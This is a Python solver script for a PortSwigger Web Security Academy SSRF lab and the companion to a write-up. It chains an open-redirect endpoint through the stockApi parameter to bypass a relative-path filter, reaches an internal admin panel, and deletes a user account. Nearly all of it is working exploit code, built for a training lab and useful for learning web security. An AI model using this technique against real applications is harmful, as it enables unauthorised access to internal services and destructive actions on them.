#!/usr/bin/env python3
"""
SSRF with filter bypass via open redirection vulnerability
PortSwigger Web Security Academy -- Server-Side Request Forgery (SSRF)

Companion script for the writeup: 04-ssrf-filter-bypass-open-redirection.md

What this does:
    stockApi is locked to relative paths on the local app, so no amount of
    encoding gets an absolute URL past it. Instead, this feeds stockApi the
    path of the app's own open-redirect endpoint (/product/nextProduct) with
    the real internal admin URL appended as its "path" query parameter --
    stockApi still looks like a relative local path to the filter, but the
    server follows the redirect straight to the internal admin panel. The
    internal admin host for this lab is 192.168.0.12:8080, a fixed target
    stated by the lab itself (unlike the IP-sweep in lab 2).

Usage:
    python 04-ssrf-filter-bypass-open-redirection.py <lab-url>
    e.g. python 04-ssrf-filter-bypass-open-redirection.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx

INTERNAL_HOST = "http://192.168.0.12:8080"
REDIRECT_ENDPOINT = "/product/nextProduct?currentProductId=1&path="


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    stock_url = f"{lab_url}/product/stock"

    chain_url = f"{REDIRECT_ENDPOINT}{INTERNAL_HOST}/admin"
    r = client.post(stock_url, data={"stockApi": chain_url})
    print(f"[*] stockApi={chain_url} -> status={r.status_code}, len={len(r.text)}")

    if not (r.status_code == 200 and len(r.text) > 200):
        print("[-] Open-redirect chain failed to reach the admin panel.")
        print(f"[-] Response preview: {r.text[:300]}")
        return

    # Same absolute-href quirk as lab 2's back-end admin panel.
    delete_match = re.search(r'href="[^"]*(/admin/delete\?username=carlos)"', r.text)
    if not delete_match:
        print("[-] Delete link not found in admin page.")
        return

    delete_path = delete_match.group(1)
    internal_delete = f"{INTERNAL_HOST}{delete_path}"
    print(f"[*] Found delete link: {delete_path}")

    delete_chain_url = f"{REDIRECT_ENDPOINT}{internal_delete}"
    print(f"[*] Deleting carlos via redirect chain: {delete_chain_url}")

    r2 = client.post(stock_url, data={"stockApi": delete_chain_url})
    print(f"[*] stockApi={delete_chain_url} -> status={r2.status_code}")

    check = client.get(lab_url)
    if "congratulations" in check.text.lower():
        print("[+] Lab solved -- carlos deleted via SSRF chained through the open redirect.")
    else:
        print("[-] Not solved yet -- check the delete response above.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
